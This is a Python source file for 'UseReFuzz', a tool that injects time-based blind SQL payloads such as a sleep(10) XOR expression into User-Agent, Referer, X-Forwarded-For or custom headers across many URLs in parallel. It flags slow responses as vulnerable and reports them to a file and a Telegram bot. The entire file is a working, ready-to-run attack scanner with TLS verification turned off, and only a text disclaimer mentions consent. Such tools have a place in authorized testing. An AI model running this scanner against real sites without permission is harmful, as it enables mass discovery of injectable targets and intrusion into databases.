#!/usr/bin/env python3
# Author = Tanishq Rathore (Kun)
# V = 2.0.0

import requests
import argparse
import urllib3
import multiprocessing as mp
import sys
import os
import datetime
import configparser

# Disable warning regarding ssl
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colour Checking
if os.name != 'nt':
    class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKCYAN = '\033[96m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        SLANT = '\x1B[3m'
else:
    class bcolors:
        HEADER = ''
        OKBLUE = ''
        OKCYAN = ''
        OKGREEN = ''
        WARNING = ''
        FAIL = ''
        ENDC = ''
        BOLD = ''
        UNDERLINE = ''
        SLANT = ''
        print("USEREFUZZ | Colouring is disable as Windows OS is detected")


# Banner
banner=f""" 
{bcolors.FAIL}               (        (               
{bcolors.WARNING}               )\ {bcolors.FAIL})     ){bcolors.WARNING}\ )            
    (       ({bcolors.FAIL} (()/(  ( ({bcolors.WARNING}(){bcolors.FAIL}/(  {bcolors.WARNING}(         
    )\ (   ){bcolors.FAIL})\ /(_))){bcolors.WARNING})\ /(_)){bcolors.FAIL}))\ ({bcolors.WARNING}  (   
 _ ((_))\ /{bcolors.FAIL}((_|_)) /{bcolors.WARNING}((_|_{bcolors.FAIL}))_/((_{bcolors.WARNING}))\ )\ {bcolors.OKBLUE} 
| | | ((_|_)) | _ (_)) | |_(_))(((_|(_) 
| |_| (_-< -_)|   / -_)| __| || |_ /_ / 
 \___//__|___||_|_\___||_|  \_,_/__/__| {bcolors.SLANT}{bcolors.UNDERLINE}V 2.0.0{bcolors.ENDC}
                                        
{bcolors.OKBLUE}
 [ 💉💉💉 {bcolors.ENDC}{bcolors.BOLD} Basic Header SQLI Injection Tester{bcolors.OKBLUE} 💉💉💉 ]{bcolors.ENDC}
 """

print(banner)

# Arguments
parser = argparse.ArgumentParser()
parser.add_argument('-l','--list', type=str,help=f'📄_List of URL to check for Header SQL Injection \t \t {bcolors.BOLD} {bcolors.OKBLUE}-l urllist.txt{bcolors.ENDC}',default="NO_LIST")
parser.add_argument('-p','--proxy', type=str,help=f'✈️ _Burp proxy or any other proxy to send the request \t \t{bcolors.BOLD} {bcolors.OKBLUE} -p http://127.1:8080{bcolors.ENDC}',default="NO_PROXY")
parser.add_argument('-m','--message', type=str,help=f'✉️ _Send a message in header for ease of search in Burp history \t \t{bcolors.BOLD} {bcolors.OKBLUE} -m "Just Testing SQLI"{bcolors.ENDC}',default="Testing for SQLI in User-Agent and Referer Header")
parser.add_argument('-s','--sleep', type=int,help=f'😴_How much sleep is used in your custom payload \t \t{bcolors.BOLD} {bcolors.OKBLUE} -s 12 {bcolors.ENDC} Default Sleep = 10' , default=10)
parser.add_argument('-v','--verbose', help=f'💣_Display All URLs and output \t \t{bcolors.BOLD} {bcolors.OKBLUE} -v {bcolors.ENDC}', action='store_true' , default=False)
parser.add_argument('-t','--telify', help=f'💬_Notify on telegram (https://github.com/root-tanishq/telify configuration file required) \t \t{bcolors.BOLD} {bcolors.OKBLUE} -t {bcolors.ENDC}', action='store_true' , default=False)
parser.add_argument('-o','--output', type=str,help=f'📁_Save the vulnerable URLs to an output file \t \t{bcolors.BOLD} {bcolors.OKBLUE} -o savefile {bcolors.ENDC}', default="NO_OUTPUT")
parser.add_argument('-u','--url', type=str,help=f'🤖_Pass a URL to check for Header SQLI Injections \t \t{bcolors.BOLD} {bcolors.OKBLUE} -u http://domain.tld/index.php {bcolors.ENDC}', default='NO_URL')
parser.add_argument('-ch','--customerheader', type=str,help=f'🔒_Custom Header for SQLI Injections \t \t{bcolors.BOLD} {bcolors.OKBLUE} -ch X-Auth {bcolors.ENDC}', default="NO_CUSTOM_HEADER")
parser.add_argument('-w','--workers', type=int,help=f'👷_No. of workers (Processes) at a time \t \t{bcolors.BOLD} {bcolors.OKBLUE}-w 10 {bcolors.ENDC}\t \t Default Workers = 5',default=5)
parser.add_argument('-i','--inject', type=str,help=f"""💉_Send your custom payload for SQL Injection \t \t{bcolors.BOLD} {bcolors.OKBLUE} -i "'+sleep(10)+'"{bcolors.ENDC} """ , default='"XOR(if(now()=sysdate(),sleep(10),0))XOR"')
args = parser.parse_args()

if args.telify:
    try:
        config = configparser.ConfigParser()
        config.read(os.path.join(os.path.expanduser( '~' ),'telify.ini'))
        CHAT_ID = config['TELIFY']['CHATID']
        API_TOKEN = config['TELIFY']['APITOKEN']
        telifyurl = f'https://api.telegram.org/bot{API_TOKEN}/sendMessage'
        requests.post(telifyurl, json={'chat_id': CHAT_ID, 'text': f'[💡] (USEREFUZZ) Runned on (⏲️) {datetime.datetime.now()} ⏬'})
    except:
        print(f"😺{bcolors.WARNING}_No Configuration found , setup telify  now => {bcolors.ENDC}{bcolors.BOLD} https://github.com/root-tanishq/telify {bcolors.ENDC}")

if args.output != "NO_OUTPUT":
    print(f'{bcolors.BOLD} 📂 Logging Output of Vulnerable URLs to => {args.output}.md \n')
    file = open(args.output + ".md","w")
    file.write(f"""
# UseReFuzz HEADER SQLI INJECTION REPORT

## Author - Tanishq Rathore (Kun)
## Github - https://github.com/root-tanishq/userefuzz
## Twitter - https://twitter.com/root_tanishq

> UseReFuzz runned on `{datetime.datetime.now()}`

## Legality

```
Usage of userefuzz for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
```

- Payload Used `{args.inject}`

- Sleep used for checking `{args.sleep}`

# Report Results
| TIME TAKEN | URL | IS VULNERABLE |
| --- | --- | --- |
""")
    file.close()
    fileappend = open(args.output + ".md" , "a")

def header_injector(url):
    if args.customerheader != 'NO_CUSTOM_HEADER':
        header = { args.customerheader : args.inject , 'UseReFuzz':args.message }
    else:
        header = {'User-Agent':args.inject , 'Referer': args.inject , 'X-Forwarded-For':args.inject , 'UseReFuzz':args.message }
    proxy = { 'http': args.proxy , 'https': args.proxy }
    sess = requests.Session()
    resp = sess.get(url , headers=header , verify=False)
    resp_time = resp.elapsed.total_seconds()
    try:
        if resp_time >= args.sleep-1:
            if args.proxy != 'NO_PROXY':
                try:
                    sess.get(url , headers=header , verify=False , proxies=proxy , timeout=0.000000000001)
                except:
                    pass
                print(f'{bcolors.OKGREEN}{bcolors.BOLD}[💉P{bcolors.ENDC}{bcolors.OKGREEN}{bcolors.BOLD}] \t[ {bcolors.ENDC}{str(resp_time)[:4]}{bcolors.BOLD}{bcolors.OKGREEN} ] URL => {bcolors.ENDC}', url)
            else:
                print(f'{bcolors.OKGREEN}{bcolors.BOLD}[💉💉{bcolors.ENDC}{bcolors.OKGREEN}{bcolors.BOLD}] \t[ {bcolors.ENDC}{str(resp_time)[:4]}{bcolors.BOLD}{bcolors.OKGREEN} ] URL => {bcolors.ENDC}', url)
            if args.output != "NO_OUTPUT":
                fileappend.write(f'| {resp_time} | "{url}" | 💉True |\n')
                fileappend.flush()
            if args.telify:
                telifyurl = f'https://api.telegram.org/bot{API_TOKEN}/sendMessage'
                requests.post(telifyurl, json={'chat_id': CHAT_ID, 'text': f'[💎] (USEREFUZZ)⛓️URL(💻)⛓️ {url} ⛓️RESPONSE TIME(⏲️)⛓️ {resp_time}'})
        else:   
            if args.verbose: 
                print(f'{bcolors.FAIL}{bcolors.BOLD}[{bcolors.ENDC}NV{bcolors.ENDC}{bcolors.FAIL}{bcolors.BOLD}] \t[ {bcolors.ENDC}{str(resp_time)[:4]}{bcolors.BOLD}{bcolors.FAIL} ] URL => {bcolors.ENDC}', url)
                if args.output != "NO_OUTPUT":
                    fileappend.write(f'| {resp_time} | "{url}" | False |\n')
                    fileappend.flush()
    except:     
        if args.verbose:       
            print(f'{bcolors.FAIL}{bcolors.BOLD}[{bcolors.ENDC}NV{bcolors.ENDC}{bcolors.FAIL}{bcolors.BOLD}] \t[ {bcolors.ENDC}{str(resp_time)[:4]}{bcolors.BOLD}{bcolors.FAIL} ] URL => {bcolors.ENDC}', url)
            if args.output != "NO_OUTPUT":
                fileappend.write(f'| {resp_time} | "{url}" | False |\n')
                fileappend.flush()


def main():
    if args.url != "NO_URL":
        header_injector(args.url)
    elif args.list != "NO_LIST":
        try:
            urllist = filter(None , open(args.list,'r').read().split("\n"))
            with mp.Pool(args.workers) as worker:
                worker.map(header_injector , urllist)
        except KeyboardInterrupt:
            exit(0)
        except:
            if os.path.isfile(args.list):
                exit(0)
            else:
                print(f'😥{bcolors.BOLD}{bcolors.FAIL}_We are unable to read the file or the file does not exist{bcolors.ENDC}')
    elif not sys.stdin.isatty():
        try:
            urlfile = []
            for line in sys.stdin:
                try:
                    urlfile.append(line.split()[0])
                except:
                    pass
            with mp.Pool(args.workers) as worker:
                worker.map(header_injector , urlfile)
        except KeyboardInterrupt:
            exit(0)
        except:
            exit(0)
    else:
        print(f"😺{bcolors.WARNING}_No Option Provided please check {bcolors.ENDC}{bcolors.BOLD}# {sys.argv[0]} --help {bcolors.ENDC}")
    if args.output != "NO_OUTPUT":
        fileappend.close()
    

main()
